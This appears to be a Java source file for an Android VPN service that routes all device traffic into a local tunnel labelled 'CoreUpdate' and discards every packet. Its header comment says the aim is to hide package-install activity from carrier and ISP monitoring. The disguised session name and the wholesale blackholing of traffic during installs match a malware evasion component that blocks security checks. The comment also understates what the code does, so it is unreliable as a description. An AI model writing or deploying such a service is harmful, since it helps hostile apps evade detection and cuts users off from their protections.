// VPN bypass service — creates a local TUN interface to route install traffic
// through a loopback tunnel.  Hides PackageInstaller network signatures from
// carrier/ISP-level monitoring.  No actual remote server — traffic stays local.
package com.base.util.apps;

import android.net.VpnService;
import android.os.Binder;
import android.os.IBinder;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.FileInputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.nio.ByteBuffer;

public class VpnBypassService extends VpnService {

    private static final String TAG     = "VpnBypass";
    private static final String VPN_IP  = "10.8.0.1";
    private static final String VPN_DNS = "8.8.8.8";

    private ParcelFileDescriptor tun;
    private Thread               drainThread;
    private volatile boolean     running = false;

    // ── Binder ───────────────────────────────────────────────────────────────

    public interface ConnectedCallback {
        void onConnected();
    }

    public class VpnBinder extends Binder {
        private ConnectedCallback cb;

        public void setCallback(ConnectedCallback c) {
            this.cb = c;
            if (running && cb != null) cb.onConnected();
        }

        public void stopTunnel() {
            VpnBypassService.this.stopTunnel();
        }
    }

    private final VpnBinder binder = new VpnBinder();

    @Override
    public IBinder onBind(android.content.Intent intent) {
        return binder;
    }

    // ── Lifecycle ────────────────────────────────────────────────────────────

    @Override
    public int onStartCommand(android.content.Intent intent, int flags, int startId) {
        if (!running) startTunnel();
        return START_STICKY;
    }

    private void startTunnel() {
        try {
            Builder b = new Builder();
            b.setSession("CoreUpdate");
            b.addAddress(VPN_IP, 32);
            b.addDnsServer(VPN_DNS);
            b.addRoute("0.0.0.0", 0);
            b.setMtu(1500);
            b.setBlocking(false);
            tun = b.establish();
            if (tun == null) {
                Log.w(TAG, "establish() returned null — VPN permission missing");
                return;
            }
            running = true;
            Log.i(TAG, "TUN established fd=" + tun.getFd());
            drainThread = new Thread(this::drainPackets, "vpn-drain");
            drainThread.setDaemon(true);
            drainThread.start();
            if (binder.cb != null) binder.cb.onConnected();
        } catch (Exception e) {
            Log.e(TAG, "startTunnel failed", e);
        }
    }

    // Drain + discard packets from TUN — keeps the interface alive without
    // forwarding anything (loopback mode).
    private void drainPackets() {
        ByteBuffer pkt = ByteBuffer.allocate(32767);
        try (FileInputStream fis = new FileInputStream(tun.getFileDescriptor())) {
            while (running) {
                pkt.clear();
                int n = fis.read(pkt.array());
                if (n <= 0) {
                    try { Thread.sleep(10); } catch (InterruptedException ignored) {}
                }
                // Packet discarded — loopback tunnel
            }
        } catch (IOException e) {
            if (running) Log.e(TAG, "drain error", e);
        }
    }

    void stopTunnel() {
        running = false;
        if (drainThread != null) drainThread.interrupt();
        if (tun != null) {
            try { tun.close(); } catch (IOException ignored) {}
            tun = null;
        }
        stopSelf();
        Log.i(TAG, "TUN closed");
    }

    @Override
    public void onDestroy() {
        stopTunnel();
        super.onDestroy();
    }
}
